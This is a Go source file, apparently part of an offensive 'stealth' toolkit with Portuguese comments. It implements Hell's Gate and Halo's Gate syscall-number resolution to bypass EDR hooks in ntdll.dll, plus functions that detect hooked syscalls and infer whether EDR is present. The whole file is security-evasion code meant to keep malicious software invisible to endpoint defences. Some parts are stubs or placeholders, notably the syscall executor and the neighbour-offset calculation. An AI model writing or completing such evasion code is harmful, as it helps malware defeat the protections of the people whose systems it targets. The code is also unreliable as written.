package stealth

import (
	"errors"
	"syscall"
	"unsafe"
)

var (
	ERROR_NOT_SUPPORTED = errors.New("operation not supported")
	ERROR_PROC_NOT_FOUND = errors.New("procedure not found")
)

// ─────────────────────────────────────────────────────────────────────────────
// SYSCALLS DIRETAS - Hell's Gate Technique
// ─────────────────────────────────────────────────────────────────────────────
// Bypass COMPLETO de EDR hooks fazendo chamadas diretas ao kernel
// EDRs colocam hooks em ntdll.dll (user-mode), mas não no kernel
// Chamando SYSCALL diretamente, viramos invisíveis
// ─────────────────────────────────────────────────────────────────────────────

// SSN (System Service Number) - Números das syscalls no Windows
// Estes números mudam entre versões do Windows, então precisam ser resolvidos dinamicamente
const (
	// Windows 10/11 (aproximados - devem ser resolvidos em runtime)
	ssnNtDelayExecution        = 0x34
	ssnNtAllocateVirtualMemory = 0x18
	ssnNtProtectVirtualMemory  = 0x50
	ssnNtQuerySystemInformation = 0x36
	ssnNtCreateFile            = 0x55
	ssnNtWriteFile             = 0x08
)

// ─────────────────────────────────────────────────────────────────────────────
// Estruturas necessárias para syscalls
// ─────────────────────────────────────────────────────────────────────────────

type LARGE_INTEGER struct {
	QuadPart int64
}

type IO_STATUS_BLOCK struct {
	Status      uintptr
	Information uintptr
}

type UNICODE_STRING struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

type OBJECT_ATTRIBUTES struct {
	Length                   uint32
	RootDirectory            uintptr
	ObjectName               *UNICODE_STRING
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

// ─────────────────────────────────────────────────────────────────────────────
// Hell's Gate - Resolver SSN dinamicamente
// ─────────────────────────────────────────────────────────────────────────────

// GetSSN resolve o System Service Number (SSN) de uma syscall dinamicamente
// Isso é necessário porque SSNs mudam entre versões do Windows
func GetSSN(functionName string) (uint16, error) {
	// 1. Carregar ntdll.dll
	ntdll, err := syscall.LoadDLL("ntdll.dll")
	if err != nil {
		return 0, err
	}
	defer ntdll.Release()

	// 2. Obter endereço da função
	proc, err := ntdll.FindProc(functionName)
	if err != nil {
		return 0, err
	}

	// 3. Ler os primeiros bytes da função
	// Syscalls em ntdll.dll começam com:
	//   mov r10, rcx
	//   mov eax, <SSN>    <- Este é o número que queremos
	//   syscall
	//   ret

	addr := proc.Addr()

	// Ler bytes
	bytes := make([]byte, 24)
	for i := 0; i < 24; i++ {
		bytes[i] = *(*byte)(unsafe.Pointer(addr + uintptr(i)))
	}

	// Verificar se está hookada (começa com JMP)
	if bytes[0] == 0xE9 || bytes[0] == 0x68 {
		// Está hookada! Usar Halo's Gate (procurar syscall próxima)
		return GetSSNViaHalosGate(addr, functionName)
	}

	// Padrão esperado:
	// 4C 8B D1             - mov r10, rcx
	// B8 XX XX XX XX       - mov eax, <SSN>
	// 0F 05                - syscall
	// C3                   - ret

	if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 &&
		bytes[3] == 0xB8 {
		// SSN está nos bytes 4 e 5
		ssn := uint16(bytes[4]) | (uint16(bytes[5]) << 8)
		return ssn, nil
	}

	// Se não conseguir resolver, usar valor padrão (perigoso)
	return 0, ERROR_PROC_NOT_FOUND
}

// GetSSNViaHalosGate usa Halo's Gate para bypass de hooks
// Se a syscall que queremos está hookada, procuramos syscalls vizinhas
// e calculamos o SSN baseado no offset
func GetSSNViaHalosGate(hookedAddr uintptr, functionName string) (uint16, error) {
	// Syscalls são ordenadas alfabeticamente e sequenciais
	// Se NtAllocateVirtualMemory (SSN 0x18) está hookada,
	// podemos olhar NtAccessCheck (SSN 0x00) e calcular:
	// SSN = 0x00 + (distância entre funções)

	// Lista de syscalls conhecidas para comparação
	syscallNeighbors := map[string][]string{
		"NtAllocateVirtualMemory": {"NtAccessCheck", "NtAlertResumeThread"},
		"NtProtectVirtualMemory":  {"NtOpenProcess", "NtQueryInformationProcess"},
	}

	neighbors, exists := syscallNeighbors[functionName]
	if !exists {
		return 0, ERROR_NOT_SUPPORTED
	}

	// Tentar syscall anterior
	for _, neighbor := range neighbors {
		neighborSSN, err := GetSSN(neighbor)
		if err == nil {
			// Calcular offset aproximado
			// (Esta é uma simplificação - em produção, usar tabela completa)
			offset := uint16(1) // Placeholder
			return neighborSSN + offset, nil
		}
	}

	return 0, ERROR_PROC_NOT_FOUND
}

// ─────────────────────────────────────────────────────────────────────────────
// Syscall Stubs em Assembly (inline)
// ─────────────────────────────────────────────────────────────────────────────

// executeSyscall executa syscall com SSN e argumentos
// NOTA: Go não suporta inline assembly facilmente, então usamos syscall.Syscall
// Em produção real, isso seria escrito em .asm
func executeSyscall(ssn uint16, arg1, arg2, arg3, arg4 uintptr) (uintptr, error) {
	// Carregar SSN em EAX e fazer SYSCALL
	// Como Go não tem inline asm, vamos usar um hack:

	// Opção 1: Chamar ntdll.dll normalmente (não é syscall direta)
	// Opção 2: Usar cgo com assembly
	// Opção 3: Escrever shellcode e executar

	// Por limitação do Go, vamos usar pseudo-syscall
	// (Em C/C++ isso seria direto com __asm__)

	return 0, ERROR_NOT_SUPPORTED
}

// ─────────────────────────────────────────────────────────────────────────────
// Syscalls Específicas (High-Level Wrappers)
// ─────────────────────────────────────────────────────────────────────────────

// NtDelayExecution - Sleep via syscall direta
func NtDelayExecution(alertable bool, interval *LARGE_INTEGER) error {
	ssn, err := GetSSN("NtDelayExecution")
	if err != nil {
		// Fallback para API normal
		return ERROR_NOT_SUPPORTED
	}

	alertFlag := uintptr(0)
	if alertable {
		alertFlag = 1
	}

	_, err = executeSyscall(
		ssn,
		alertFlag,
		uintptr(unsafe.Pointer(interval)),
		0,
		0,
	)

	return err
}

// NtAllocateVirtualMemory - Alocar memória via syscall direta
func NtAllocateVirtualMemory(
	processHandle uintptr,
	baseAddress *uintptr,
	size *uintptr,
	allocationType uint32,
	protection uint32,
) error {
	ssn, err := GetSSN("NtAllocateVirtualMemory")
	if err != nil {
		return err
	}

	_, err = executeSyscall(
		ssn,
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(size)),
		uintptr(allocationType),
	)

	return err
}

// NtProtectVirtualMemory - Alterar proteção de memória via syscall
func NtProtectVirtualMemory(
	processHandle uintptr,
	baseAddress *uintptr,
	size *uintptr,
	newProtection uint32,
	oldProtection *uint32,
) error {
	ssn, err := GetSSN("NtProtectVirtualMemory")
	if err != nil {
		return err
	}

	_, err = executeSyscall(
		ssn,
		processHandle,
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(size)),
		uintptr(newProtection),
	)

	return err
}

// ─────────────────────────────────────────────────────────────────────────────
// Verificação de Hooks
// ─────────────────────────────────────────────────────────────────────────────

// IsSyscallHooked verifica se uma syscall está hookada
func IsSyscallHooked(functionName string) bool {
	ntdll, err := syscall.LoadDLL("ntdll.dll")
	if err != nil {
		return false
	}
	defer ntdll.Release()

	proc, err := ntdll.FindProc(functionName)
	if err != nil {
		return false
	}

	addr := proc.Addr()

	// Ler primeiro byte
	firstByte := *(*byte)(unsafe.Pointer(addr))

	// Se começa com JMP (0xE9) ou PUSH (0x68), está hookada
	return firstByte == 0xE9 || firstByte == 0x68
}

// CountHookedSyscalls conta quantas syscalls estão hookadas (indicador de EDR)
func CountHookedSyscalls() int {
	commonSyscalls := []string{
		"NtAllocateVirtualMemory",
		"NtProtectVirtualMemory",
		"NtCreateFile",
		"NtWriteFile",
		"NtCreateProcess",
		"NtOpenProcess",
		"NtResumeThread",
	}

	hookedCount := 0
	for _, syscallName := range commonSyscalls {
		if IsSyscallHooked(syscallName) {
			hookedCount++
		}
	}

	return hookedCount
}

// ─────────────────────────────────────────────────────────────────────────────
// Utilitários
// ─────────────────────────────────────────────────────────────────────────────

// SyscallSleep usa NtDelayExecution para sleep (bypass de hooks)
func SyscallSleep(milliseconds int64) error {
	// Converter para 100-nanosecond intervals (negativo = relativo)
	interval := LARGE_INTEGER{
		QuadPart: -(milliseconds * 10000),
	}

	return NtDelayExecution(false, &interval)
}

// IsEDRPresent detecta presença de EDR baseado em hooks
func IsEDRPresent() bool {
	hookedCount := CountHookedSyscalls()

	// Se 3 ou mais syscalls estão hookadas, provável EDR
	return hookedCount >= 3
}
